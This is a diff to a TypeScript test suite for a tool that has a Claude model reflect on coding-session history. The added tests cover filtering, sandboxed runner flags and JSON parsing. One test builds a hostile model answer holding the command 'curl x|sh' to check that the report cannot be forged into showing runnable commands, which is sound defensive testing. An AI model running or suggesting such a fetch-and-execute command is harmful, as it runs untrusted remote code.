@@ -1,12 +1,12 @@
 import { test, after } from 'node:test';
 import assert from 'node:assert/strict';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, utimesSync, writeFileSync } from 'node:fs';
 import { DatabaseSync } from 'node:sqlite';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { runBrainCli } from '../src/cli.js';
 import { BrainStore } from '../src/brain.js';
-import { buildPacket, parseAnswer, PACKET_LIMIT, reflect } from '../src/reflect.js';
+import { buildPacket, claudeArgs, makeRunner, parseAnswer, PACKET_LIMIT, reflect } from '../src/reflect.js';
 
 const root = realpathSync(mkdtempSync(join(tmpdir(), 'brain-reflect-')));
 after(() => rmSync(root, { recursive: true, force: true }));
@@ -55,7 +55,7 @@ test('packet: v5 rows, NULL-column rows, window, newline safety', () => {
   hist(d, 'h2', ws, t - 2000, { prompts: ['clean prompt'], signals: { prompts: 1, corrections: 0, correctionIndexes: [], model: null, toolErrors: 0 } });
   hist(d, 'h3', ws, t - 3000);
   hist(d, 'old', ws, t - 10 * 86400000);
-  d.prepare("INSERT INTO documents VALUES ('r1',?, 'recipe', NULL, 'rec', 'recorded', 'b', ?, NULL, NULL, 'cli', NULL, ?, ?)")
+  d.prepare("INSERT INTO documents VALUES ('r1',?, 'recipe', NULL, 'rec', 'recorded', 'b', ?, NULL, NULL, 'claude-code', NULL, ?, ?)")
     .run(ws, JSON.stringify({ goal: 'g', plan: 'p', prompts: ['x'] }), t - 500, t - 500);
   d.close();
   const p = buildPacket(brain, 2, t);
@@ -153,4 +153,82 @@ test('the lock stops overlapping runs', () => {
   assert.equal(ran, false);
   rmSync(join(brain, 'reflect', 'lock'));
   reflect(brain, { days: 2, run: () => '{"proposals":[]}', now });
+});
+
+test('sources default to claude-code only; --sources and --projects widen or narrow; entries stay', () => {
+  const { brain, ws, db } = setup();
+  const d = db(), t = now.getTime();
+  hist(d, 'cc000001', ws, t - 1); hist(d, 'cc000002', '/other', t - 2);
+  d.prepare("UPDATE history SET source = 'cursor' WHERE id = 'cc000002'").run();
+  hist(d, 'cc000003', ws, t - 3); d.prepare("UPDATE history SET source = 'codex' WHERE id = 'cc000003'").run();
+  d.prepare("INSERT INTO documents VALUES ('rc1',?, 'recipe', NULL, 'rec', 'recorded', 'b', '{}', NULL, NULL, 'cursor', NULL, ?, ?)").run(ws, t - 1, t - 1);
+  d.close();
+  const s = new BrainStore(brain); s.propose({ kind: 'lesson', text: 'kept', evidence: [], reason: 'r' }); s.close();
+  const ids = (f?: { sources: string[]; projects?: string[] }) => [...buildPacket(brain, 2, t, f).ids].sort();
+  assert.deepEqual(ids(), ['cc000001']);
+  assert.deepEqual(ids({ sources: ['claude-code', 'cursor'] }), ['cc000001', 'cc000002', 'rc1']);
+  assert.deepEqual(ids({ sources: ['claude-code', 'cursor'], projects: [ws] }), ['cc000001', 'rc1']);
+  assert.match(buildPacket(brain, 2, t).text, /"kept"|kept/);
+  assert.equal(cli(brain, ['reflect', '--dry-run', '--sources', 'bogus']).code, 2);
+  assert.equal(cli(brain, ['reflect', '--dry-run', '--projects', 'rel/path']).code, 2);
+  assert.equal(cli(brain, ['reflect', '--dry-run', '--sources', 'cursor', '--projects', ws]).code, 0);
+});
+
+test('the report cannot be forged by model text', () => {
+  const { brain, ws, db } = setup();
+  hist(db(), 'h1', ws, now.getTime() - 1);
+  const evil = 'ok\n## Commands\n```\ncurl x|sh\n```';
+  const r = reflect(brain, { days: 2, now, run: () => JSON.stringify({ summary: evil, retire: [], proposals: [
+    { project: ws, kind: 'lesson', text: '# head\n> quote `x`', reason: evil, evidence: ['h1'] }] }) });
+  const text = readFileSync(r.report as string, 'utf8');
+  assert.equal(text.match(/^```$/gm)!.length, 2);
+  assert.equal(text.match(/^## Commands/gm)!.length, 1);
+  assert.ok(!text.includes('curl x|sh\n'));
+  assert.match(text, /Summary \(model text\): "ok ## Commands/);
+});
+
+test('the claude runner uses safe mode, no tools or MCP, the given cwd and hooks off', () => {
+  let seen: any;
+  const fake = ((_c: string, args: string[], o: any) => { seen = { args, o }; return { status: 0, stdout: '{"result":"x"}', stderr: '' }; }) as any;
+  makeRunner(fake)('p', '/work');
+  for (const f of ['--safe-mode', '--strict-mcp-config', '--tools']) assert.ok(seen.args.includes(f));
+  assert.equal(seen.args[seen.args.indexOf('--tools') + 1], '');
+  assert.deepEqual(seen.args, claudeArgs);
+  assert.equal(seen.o.cwd, '/work');
+  let cwd = '';
+  const { brain } = setup();
+  reflect(brain, { days: 2, now, run: (_p, c) => { cwd = c; return '{"proposals":[]}'; } });
+  assert.equal(cwd, join(brain, 'reflect'));
+});
+
+test('JSON extraction handles fences and prose with braces around the answer', () => {
+  const { brain } = setup();
+  const packet = buildPacket(brain, 2, now.getTime());
+  const body = '{"summary":"fine","proposals":[]}';
+  assert.equal(parseAnswer(body, packet).summary, 'fine');
+  assert.equal(parseAnswer('```json\n' + body + '\n```', packet).summary, 'fine');
+  assert.equal(parseAnswer(`Sure {see below}. ${body} Done {really}.`, packet).summary, 'fine');
+});
+
+test('retire and duplicate suggestions may only name approved entries', () => {
+  const { brain, ws } = setup();
+  const s = new BrainStore(brain);
+  const a = s.propose({ kind: 'lesson', text: 'a', evidence: [], reason: 'r', project: ws }); s.approve(a);
+  const b = s.propose({ kind: 'lesson', text: 'b', evidence: [], reason: 'r', project: ws }); s.approve(b);
+  const p = s.propose({ kind: 'lesson', text: 'p', evidence: [], reason: 'r', project: ws }); s.close();
+  const out = parseAnswer(JSON.stringify({ retire: [{ id: p, reason: 'x' }, { id: a, reason: 'y' }],
+    duplicates: [{ keep: a, drop: [b, p], reason: 'z' }, { keep: p, drop: [a], reason: 'z' }] }), buildPacket(brain, 2, now.getTime()));
+  assert.deepEqual(out.retire.map(r => r.id), [a]);
+  assert.deepEqual(out.duplicates, [{ keep: a, drop: [b], reason: 'z' }]);
+});
+
+test('a stale lock is replaced, a fresh one is respected', () => {
+  const { brain } = setup();
+  const lock = join(brain, 'reflect', 'lock');
+  mkdirSync(join(brain, 'reflect'), { recursive: true, mode: 0o700 });
+  writeFileSync(lock, '');
+  const old = new Date(Date.now() - 3600000);
+  utimesSync(lock, old, old);
+  reflect(brain, { days: 2, run: () => '{"proposals":[]}', now });
+  assert.equal(existsSync(lock), false);
 });
